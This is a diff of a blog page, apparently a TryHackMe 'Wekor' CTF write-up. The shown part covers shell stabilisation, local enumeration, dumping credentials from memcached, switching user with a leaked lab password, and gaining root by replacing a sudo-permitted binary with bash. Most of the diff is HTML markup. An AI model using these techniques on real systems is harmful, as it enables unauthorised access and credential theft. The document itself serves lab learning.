+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">osboxes
+</span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>Stabilize the shell with python one liner :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></blockquote>
 <h3 id="enumeration">Enumeration</h3>
 <p>Performing basic manual enumeration, we will find a local service running on the port number <strong>11211</strong>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2158,27 +2158,27 @@ osboxes
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">www-data@osboxes:/$ netstat -tulnp
-netstat -tulnp
-<span class="o">(</span>Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.<span class="o">)</span>
-Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
-tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
-tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
-tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
-tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
-tcp6       <span class="m">0</span>      <span class="m">0</span> :::80                   :::*                    LISTEN      -               
-tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -               
-tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:631                 :::*                    LISTEN      -               
-udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:68              0.0.0.0:*                           -               
-udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:631             0.0.0.0:*                           -               
-udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:45195           0.0.0.0:*                           -               
-udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:5353            0.0.0.0:*                           -               
-udp6       <span class="m">0</span>      <span class="m">0</span> :::5353                 :::*                                -               
-udp6       <span class="m">0</span>      <span class="m">0</span> :::53036                :::*                                - 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@osboxes:/$ netstat -tulnp
+</span></span><span class="line"><span class="cl">netstat -tulnp
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
+</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::80                   :::*                    LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -               
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:631                 :::*                    LISTEN      -               
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:68              0.0.0.0:*                           -               
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:631             0.0.0.0:*                           -               
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:45195           0.0.0.0:*                           -               
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:5353            0.0.0.0:*                           -               
+</span></span><span class="line"><span class="cl">udp6       <span class="m">0</span>      <span class="m">0</span> :::5353                 :::*                                -               
+</span></span><span class="line"><span class="cl">udp6       <span class="m">0</span>      <span class="m">0</span> :::53036                :::*                                - 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This service is called <a href="https://memcached.org/">Memcached</a> which is a distributed memory object caching system.</p>
 <blockquote>
@@ -2187,7 +2187,7 @@ udp6       <span class="m">0</span>      <span class="m">0</span> :::53036      
 <p>Using <code>memcached-tool</code> script with <code>dump</code> argument, we will dump the cached data, which contains password for user <strong>Orka</strong>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2217,42 +2217,42 @@ udp6       <span class="m">0</span>      <span class="m">0</span> :::53036      
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">ww-data@osboxes:/usr/share/memcached/scripts$ ls -la
-ls -la
-total <span class="m">56</span>
-drwxr-xr-x <span class="m">2</span> root root  <span class="m">4096</span> Jan <span class="m">22</span> 10:27 .
-drwxr-xr-x <span class="m">3</span> root root  <span class="m">4096</span> Jan <span class="m">22</span> 10:27 ..
--rw-r--r-- <span class="m">1</span> root root   <span class="m">638</span> Sep  <span class="m">5</span>  <span class="m">2019</span> README.damemtop
--rwxr-xr-x <span class="m">1</span> root root <span class="m">15891</span> Sep  <span class="m">5</span>  <span class="m">2019</span> damemtop
--rw-r--r-- <span class="m">1</span> root root   <span class="m">294</span> Sep  <span class="m">5</span>  <span class="m">2019</span> damemtop.yaml
--rwxr-xr-x <span class="m">1</span> root root  <span class="m">7812</span> Sep  <span class="m">5</span>  <span class="m">2019</span> mc_slab_mover
--rwxr-xr-x <span class="m">1</span> root root  <span class="m">5692</span> Sep  <span class="m">5</span>  <span class="m">2019</span> memcached-tool
--rwxr-xr-x <span class="m">1</span> root root  <span class="m">2770</span> Sep  <span class="m">5</span>  <span class="m">2019</span> start-memcached
--rwxr-xr-x <span class="m">1</span> root root  <span class="m">1423</span> Sep  <span class="m">5</span>  <span class="m">2019</span> systemd-memcached-wrapper
-www-data@osboxes:/usr/share/memcached/scripts$ ./memcached-tool localhost:11211 dump
-&lt;/memcached/scripts$ ./memcached-tool localhost:11211 dump                   
-Dumping memcache contents
-  Number of buckets: <span class="m">1</span>
-  Number of items  : <span class="m">5</span>
-Dumping bucket <span class="m">1</span> - <span class="m">5</span> total items
-add email <span class="m">0</span> <span class="m">1615309833</span> <span class="m">14</span>
-Orka@wekor.thm
-add password <span class="m">0</span> <span class="m">1615309833</span> <span class="m">15</span>
-<span class="o">[</span>REDACTED<span class="o">]</span>
-add salary <span class="m">0</span> <span class="m">1615309833</span> <span class="m">8</span>
-<span class="nv">$100</span>,000
-add id <span class="m">0</span> <span class="m">1615309833</span> <span class="m">4</span>
-<span class="m">3476</span>
-add username <span class="m">0</span> <span class="m">1615309833</span> <span class="m">4</span>
-Orka
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ww-data@osboxes:/usr/share/memcached/scripts$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">56</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root  <span class="m">4096</span> Jan <span class="m">22</span> 10:27 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root  <span class="m">4096</span> Jan <span class="m">22</span> 10:27 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">638</span> Sep  <span class="m">5</span>  <span class="m">2019</span> README.damemtop
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">15891</span> Sep  <span class="m">5</span>  <span class="m">2019</span> damemtop
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">294</span> Sep  <span class="m">5</span>  <span class="m">2019</span> damemtop.yaml
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">7812</span> Sep  <span class="m">5</span>  <span class="m">2019</span> mc_slab_mover
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">5692</span> Sep  <span class="m">5</span>  <span class="m">2019</span> memcached-tool
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">2770</span> Sep  <span class="m">5</span>  <span class="m">2019</span> start-memcached
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">1423</span> Sep  <span class="m">5</span>  <span class="m">2019</span> systemd-memcached-wrapper
+</span></span><span class="line"><span class="cl">www-data@osboxes:/usr/share/memcached/scripts$ ./memcached-tool localhost:11211 dump
+</span></span><span class="line"><span class="cl">&lt;/memcached/scripts$ ./memcached-tool localhost:11211 dump                   
+</span></span><span class="line"><span class="cl">Dumping memcache contents
+</span></span><span class="line"><span class="cl">  Number of buckets: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">  Number of items  : <span class="m">5</span>
+</span></span><span class="line"><span class="cl">Dumping bucket <span class="m">1</span> - <span class="m">5</span> total items
+</span></span><span class="line"><span class="cl">add email <span class="m">0</span> <span class="m">1615309833</span> <span class="m">14</span>
+</span></span><span class="line"><span class="cl">Orka@wekor.thm
+</span></span><span class="line"><span class="cl">add password <span class="m">0</span> <span class="m">1615309833</span> <span class="m">15</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span><span class="line"><span class="cl">add salary <span class="m">0</span> <span class="m">1615309833</span> <span class="m">8</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$100</span>,000
+</span></span><span class="line"><span class="cl">add id <span class="m">0</span> <span class="m">1615309833</span> <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="m">3476</span>
+</span></span><span class="line"><span class="cl">add username <span class="m">0</span> <span class="m">1615309833</span> <span class="m">4</span>
+</span></span><span class="line"><span class="cl">Orka
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="lateral-movement">Lateral Movement</h2>
 <p>Let us switch to <strong>Orka</strong> user and grab the user flag located in the their home directory.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2262,20 +2262,20 @@ Orka
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">www-data@osboxes:/usr/share/memcached/scripts$ su Orka
-su Orka
-Password: OrkAiSC00L24/7$
-Orka@osboxes:~$ id 
-id
-<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>Orka<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>Orka<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>Orka<span class="o">)</span>
-Orka@osboxes:~$ cat user.txt <span class="p">|</span> wc -c
-<span class="m">33</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@osboxes:/usr/share/memcached/scripts$ su Orka
+</span></span><span class="line"><span class="cl">su Orka
+</span></span><span class="line"><span class="cl">Password: OrkAiSC00L24/7$
+</span></span><span class="line"><span class="cl">Orka@osboxes:~$ id 
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>Orka<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>Orka<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>Orka<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Orka@osboxes:~$ cat user.txt <span class="p">|</span> wc -c
+</span></span><span class="line"><span class="cl"><span class="m">33</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>By issuing <code>sudo -l</code> we can see which commands we can execute as root and some other important information.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2287,24 +2287,24 @@ Orka@osboxes:~$ cat user.txt <span class="p">|</span> wc -c
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">Orka@osboxes:~$ sudo -l
-sudo -l
-<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> Orka: OrkAiSC00L24/7$
-
-Matching Defaults entries <span class="k">for</span> Orka on osboxes:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User Orka may run the following commands on osboxes:
-    <span class="o">(</span>root<span class="o">)</span> /home/Orka/Desktop/bitcoin
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Orka@osboxes:~$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> Orka: OrkAiSC00L24/7$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> Orka on osboxes:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Orka may run the following commands on osboxes:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /home/Orka/Desktop/bitcoin
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can execute <strong>bitcoin</strong> as <strong>root</strong>.</p>
 <hr />
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2313,31 +2313,31 @@ User Orka may run the following commands on osboxes:
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">Orka@osboxes:~/Desktop$ ls -la
-ls -la
-total <span class="m">20</span>
-drwxrwxr-x  <span class="m">2</span> root root <span class="m">4096</span> Jan <span class="m">23</span> 17:45 .
-drwxr-xr-- <span class="m">18</span> Orka Orka <span class="m">4096</span> Feb  <span class="m">1</span> 13:50 ..
--rwxr-xr-x  <span class="m">1</span> root root <span class="m">7696</span> Jan <span class="m">23</span> 15:23 bitcoin
--rwxr--r--  <span class="m">1</span> root root  <span class="m">588</span> Jan <span class="m">23</span> 14:27 transfer.py
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Orka@osboxes:~/Desktop$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> root root <span class="m">4096</span> Jan <span class="m">23</span> 17:45 .
+</span></span><span class="line"><span class="cl">drwxr-xr-- <span class="m">18</span> Orka Orka <span class="m">4096</span> Feb  <span class="m">1</span> 13:50 ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root <span class="m">7696</span> Jan <span class="m">23</span> 15:23 bitcoin
+</span></span><span class="line"><span class="cl">-rwxr--r--  <span class="m">1</span> root root  <span class="m">588</span> Jan <span class="m">23</span> 14:27 transfer.py
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We cannot modify the <code>transfer.py</code> script nor <strong>bitcoin</strong>.<br />
 With <code>file</code> command, we can determine that the <strong>bitcoin</strong> is an executable.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">Orka@osboxes:~$ file /home/Orka/Desktop/bitcoin
-bitcoin: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Orka@osboxes:~$ file /home/Orka/Desktop/bitcoin
+</span></span><span class="line"><span class="cl">bitcoin: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Let us replace the <strong>bitcoin</strong> executable with <strong>bash</strong> and get the root shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2345,13 +2345,13 @@ bitcoin: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">Orka@osboxes:~$ mv Desktop original
-Orka@osboxes:~$ mkdir Desktop
-Orka@osboxes:~$ cp /bin/bash ./Desktop/bitcoin
-Orka@osboxes:~$ sudo /home/Orka/Desktop/bitcoin
-root@osboxes:~/Desktop# id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Orka@osboxes:~$ mv Desktop original
+</span></span><span class="line"><span class="cl">Orka@osboxes:~$ mkdir Desktop
+</span></span><span class="line"><span class="cl">Orka@osboxes:~$ cp /bin/bash ./Desktop/bitcoin
+</span></span><span class="line"><span class="cl">Orka@osboxes:~$ sudo /home/Orka/Desktop/bitcoin
+</span></span><span class="line"><span class="cl">root@osboxes:~/Desktop# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></br>
 <p><em>Thank you for reading this blog post.</em></p>
@@ -2545,29 +2545,6 @@ root@osboxes:~/Desktop# id
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fwekor%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=Wekor%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fwekor%2f&hashtags=enumeration%2csqli%2cremote%20code%20execution%2cwordpress%2cprivilege%20escalation&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2593,7 +2570,7 @@ root@osboxes:~/Desktop# id
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2780,7 +2757,7 @@ root@osboxes:~/Desktop# id
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3801,7 +3778,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
